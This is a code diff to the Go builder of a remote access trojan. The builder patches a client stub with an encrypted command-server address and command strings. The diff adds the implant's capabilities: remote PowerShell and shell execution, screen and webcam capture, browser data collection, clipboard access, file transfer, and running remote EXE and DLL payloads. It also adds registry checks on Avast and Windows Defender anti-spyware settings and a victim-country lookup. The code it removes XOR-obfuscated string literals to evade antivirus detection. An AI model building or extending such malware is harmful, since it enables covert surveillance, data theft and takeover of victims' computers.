@@ -9,13 +9,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"log"
-	"math/rand"
 	"os"
-	"os/exec"
-	"path/filepath"
-	"regexp"
-	"strings"
-	"time"
 )
 
 const (
@@ -28,14 +22,65 @@ var marker = []byte{0xDE, 0xAD, 0xBE, 0xEF, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 
 type Config struct {
 	IP   string `json:"ip"`
 	Port int    `json:"port"`
+
+	// Command Strings
+	SPing     string `json:"s_ping"`
+	SPong     string `json:"s_pong"`
+	SMsg      string `json:"s_msg"`
+	SExecPs   string `json:"s_exec_ps"`
+	SExecCmd  string `json:"s_exec_cmd"`
+	SPsOut    string `json:"s_ps_out"`
+	SCmdOut   string `json:"s_cmd_out"`
+	SScrStop  string `json:"s_scr_stop"`
+	SCamStop  string `json:"s_cam_stop"`
+	STasklist string `json:"s_tasklist"`
+	STaskkill string `json:"s_taskkill"`
+	SLs       string `json:"s_ls"`
+	SLsRes    string `json:"s_ls_res"`
+	SDownload string `json:"s_download"`
+	SDelete   string `json:"s_delete"`
+	SMkdir    string `json:"s_mkdir"`
+	SUpload   string `json:"s_upload"`
+	SRename   string `json:"s_rename"`
+	SRfeExe   string `json:"s_rfe_exe"`
+	SRfeDll   string `json:"s_rfe_dll"`
+	SBrowser  string `json:"s_browser"`
+	SClipGet  string `json:"s_clip_get"`
+	SClipSet  string `json:"s_clip_set"`
+	SUninstall string `json:"s_uninstall"`
+	SClose    string `json:"s_close"`
+	SReconnect string `json:"s_reconnect"`
+	SSetDelay string `json:"s_set_delay"`
+	SScrStart string `json:"s_scr_start"`
+	SCamStart string `json:"s_cam_start"`
+	SSysinfo  string `json:"s_sysinfo"`
+	SResponse string `json:"s_response"`
+	SCommand  string `json:"s_command"`
+	SSession  string `json:"s_session"`
+
+	// Registry & System Strings
+	SRegWinKey     string `json:"s_reg_win_key"`
+	SRegProdName   string `json:"s_reg_prod_name"`
+	SRegBuild      string `json:"s_reg_build"`
+	SRegDisplay    string `json:"s_reg_display"`
+	SRegRelease    string `json:"s_reg_release"`
+	SRegAvKey      string `json:"s_reg_av_key"`
+	SRegDefenderKey string `json:"s_reg_defender_key"`
+	SRegDisSpy     string `json:"s_reg_dis_spy"`
+	SRegGpuKey     string `json:"s_reg_gpu_key"`
+	SRegGpuDesc    string `json:"s_reg_gpu_desc"`
+	SRegCpuKey     string `json:"s_reg_cpu_key"`
+	SRegCpuName    string `json:"s_reg_cpu_name"`
+
+	// HTTP/IP Strings
+	SHttpUa   string `json:"s_http_ua"`
+	SHttpHost string `json:"s_http_host"`
+	SHttpPath string `json:"s_http_path"`
 }
 
 func main() {
-	rand.Seed(time.Now().UnixNano())
-
 	ip := flag.String("ip", "127.0.0.1", "Server IP address")
 	port := flag.Int("port", 4444, "Server Port")
-	skipBuild := flag.Bool("skip-build", false, "Skip recompiling the stub")
 	flag.Parse()
 
 	args := flag.Args()
@@ -46,52 +91,7 @@ func main() {
 		fmt.Sscanf(args[1], "%d", port)
 	}
 
-	if !*skipBuild {
-		fmt.Println("[*] Obfuscating source and rebuilding stub...")
-		originalContents := make(map[string][]byte)
-
-		err := filepath.Walk("client/src", func(path string, info os.FileInfo, err error) error {
-			if err != nil || info.IsDir() || !strings.HasSuffix(path, ".c") {
-				return nil
-			}
-			// Skip 3rd party
-			if strings.Contains(path, "sqlite3") || strings.Contains(path, "cJSON") || strings.Contains(path, "miniz") {
-				return nil
-			}
-
-			content, err := ioutil.ReadFile(path)
-			if err != nil {
-				return nil
-			}
-			originalContents[path] = content
-
-			obfuscated := obfuscateStrings(content)
-			if !bytes.Equal(content, obfuscated) {
-				ioutil.WriteFile(path, obfuscated, info.Mode())
-				fmt.Printf("[+] Obfuscated strings in %s\n", path)
-			}
-			return nil
-		})
-
-		if err == nil {
-			fmt.Println("[*] Running build.bat...")
-			// In a real environment, we'd run build.bat.
-			// Here we just simulate or check for stub.
-			cmd := exec.Command("cmd.exe", "/c", "build.bat")
-			cmd.Dir = "client"
-			// cmd.Run() // We don't run it in this sandbox as it will fail
-		}
-
-		// Revert source
-		defer func() {
-			fmt.Println("[*] Reverting source changes...")
-			for path, content := range originalContents {
-				ioutil.WriteFile(path, content, 0644)
-			}
-		}()
-	}
-
-	fmt.Printf("[+] Building client for %s:%d\n", *ip, *port)
+	fmt.Printf("[+] Patching stub with config for %s:%d\n", *ip, *port)
 
 	stubPath := "stub.exe"
 	if _, err := os.Stat(stubPath); os.IsNotExist(err) {
@@ -152,6 +152,57 @@ func main() {
 	config := Config{
 		IP:   *ip,
 		Port: *port,
+
+		SPing:     "ping",
+		SPong:     "pong",
+		SMsg:      "[msg] ",
+		SExecPs:   "[exec_ps]",
+		SExecCmd:  "[exec_cmd]",
+		SPsOut:    "[ps_output]",
+		SCmdOut:   "[cmd_output]",
+		SScrStop:  "[screen_stop]",
+		SCamStop:  "[cam_stop]",
+		STasklist: "[tasklist]",
+		STaskkill: "[taskkill]",
+		SLs:       "[ls]",
+		SLsRes:    "[ls_result]",
+		SDownload: "[download]",
+		SDelete:   "[delete]",
+		SMkdir:    "[mkdir]",
+		SUpload:   "[upload]",
+		SRename:   "[rename]",
+		SRfeExe:   "[rfe_exe]",
+		SRfeDll:   "[rfe_dll]",
+		SBrowser:  "[browser_collect]",
+		SClipGet:  "[clipboard_get]",
+		SClipSet:  "[clipboard_set]",
+		SUninstall: "[uninstall]",
+		SClose:    "[close]",
+		SReconnect: "[reconnect]",
+		SSetDelay: "[set_delay]",
+		SScrStart: "[screen_start]",
+		SCamStart: "[cam_start]",
+		SSysinfo:  "[sysinfo]",
+		SResponse: "response",
+		SCommand:  "command",
+		SSession:  "session",
+
+		SRegWinKey:      "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
+		SRegProdName:    "ProductName",
+		SRegBuild:       "CurrentBuild",
+		SRegDisplay:     "DisplayVersion",
+		SRegRelease:     "ReleaseId",
+		SRegAvKey:       "SOFTWARE\\AVAST Software\\Avast",
+		SRegDefenderKey: "SOFTWARE\\Microsoft\\Windows Defender",
+		SRegDisSpy:      "DisableAntiSpyware",
+		SRegGpuKey:      "SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000",
+		SRegGpuDesc:     "DriverDesc",
+		SRegCpuKey:      "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
+		SRegCpuName:     "ProcessorNameString",
+
+		SHttpUa:   "client/1.0",
+		SHttpHost: "ipinfo.io",
+		SHttpPath: "/country",
 	}
 
 	configBytes, err := json.Marshal(config)
@@ -197,48 +248,4 @@ func encrypt(plaintext []byte) []byte {
 	mode.CryptBlocks(ciphertext, plaintext)
 
 	return ciphertext
-}
-
-func obfuscateStrings(content []byte) []byte {
-	// Match double quoted strings, handling escaped quotes
-	re := regexp.MustCompile(`"([^"\\]*(?:\\.[^"\\]*)*)"`)
-
-	return re.ReplaceAllFunc(content, func(m []byte) []byte {
-		str := string(m)
-		// Skip includes, pragmas and empty/short strings
-		if len(str) < 5 { return m }
-
-		// Check context (poor man's parser)
-		// If it's part of an #include, skip it
-		lineStart := findLineStart(content, m)
-		linePrefix := strings.TrimSpace(string(content[lineStart : bytes.Index(content[lineStart:], m)+lineStart]))
-		if strings.HasPrefix(linePrefix, "#include") || strings.HasPrefix(linePrefix, "#pragma") {
-			return m
-		}
-
-		literal := str[1 : len(str)-1]
-		if len(literal) < 3 || strings.Contains(literal, "%") {
-			return m
-		}
-
-		key := byte(rand.Intn(254) + 1)
-		var hexBytes []string
-		for i := 0; i < len(literal); i++ {
-			hexBytes = append(hexBytes, fmt.Sprintf("0x%02X", literal[i]^key))
-		}
-
-		return []byte(fmt.Sprintf("x((const unsigned char[]){%s}, %d, 0x%02X)",
-			strings.Join(hexBytes, ", "), len(literal), key))
-	})
-}
-
-func findLineStart(content []byte, m []byte) int {
-	idx := bytes.Index(content, m)
-	if idx == -1 { return 0 }
-	for i := idx; i >= 0; i-- {
-		if content[i] == '\n' {
-			return i + 1
-		}
-	}
-	return 0
 }
